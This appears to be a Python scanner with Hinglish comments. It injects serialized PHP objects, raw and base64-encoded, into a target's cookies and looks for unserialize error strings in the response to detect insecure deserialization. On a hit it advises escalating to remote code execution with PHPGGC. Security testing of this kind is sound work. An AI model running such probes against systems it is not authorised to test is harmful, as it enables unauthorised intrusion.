import requests
import sys
import base64

def scan_deserialization(target_url):
    print(f"\n[*] Bhai, starting Insecure Deserialization Scan on: {target_url}")
    print("[*] Hunting for PHP Object Injection vulnerabilities...\n")
    print("--------------------------------------------------")

    # THE HACKER'S PAYLOADS
    # Hum ek 'stdClass' (PHP ka default empty object) bhej rahe hain.
    # Agar server isko unpack karega, toh woh confuse ho jayega aur error dega. Us error se hume bug ka pata chalega!
    raw_payload = 'O:8:"stdClass":0:{}'
    
    # Kayi baar developers serialized object ko base64 mein chupa dete hain, toh hum dono bhejenge
    b64_payload = base64.b64encode(raw_payload.encode()).decode()

    print("[*] Injecting malicious serialized objects into Cookies and URL Parameters...")
    
    # Cookies mein payload inject karna (Most common place for this bug)
    cookies = {
        'session': b64_payload,
        'user_data': raw_payload,
        'auth_token': b64_payload
    }

    try:
        # Request bhejna
        headers = {"User-Agent": "Mozilla/5.0 (X11; Arch Linux x86_64)"}
        response = requests.get(target_url, cookies=cookies, headers=headers, timeout=5)
        
        # THE MAGIC LOGIC: Bug Detection
        # Agar response mein yeh specific PHP errors aate hain, matlab server ne hamara nakli object open kar liya!
        errors = [
            "PHP Incomplete Class",
            "unserialize()",
            "stdClass",
            "Cannot use object of type",
            "Object of class"
        ]

        found_bug = False
        for error in errors:
            if error in response.text:
                print(f"\n   [!!!] JACKPOT 🎯 INSECURE DESERIALIZATION LIKELY FOUND!")
                print(f"   [!!!] The server attempted to unpack our injected object.")
                print(f"   [!!!] Error Reflected: '{error}'")
                print("   [!!!] Impact: Escalate this to Remote Code Execution (RCE) using a tool like PHPGGC!")
                found_bug = True
                break
        
        if not found_bug:
            print("\n[-] No deserialization errors found. The server is either secure, ignoring our cookies, or handling exceptions silently.")

    except requests.exceptions.RequestException as e:
        print(f"\n[-] Arre yaar, connection failed or timed out: {e}")

    print("--------------------------------------------------")
    print("[+] Deserialization Scan Complete, Bhai!")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 deserialize_hunter.py <target_url>")
        print("Example: python3 deserialize_hunter.py http://testphp.vulnweb.com")
        sys.exit(1)
        
    target = sys.argv[1]
    scan_deserialization(target)
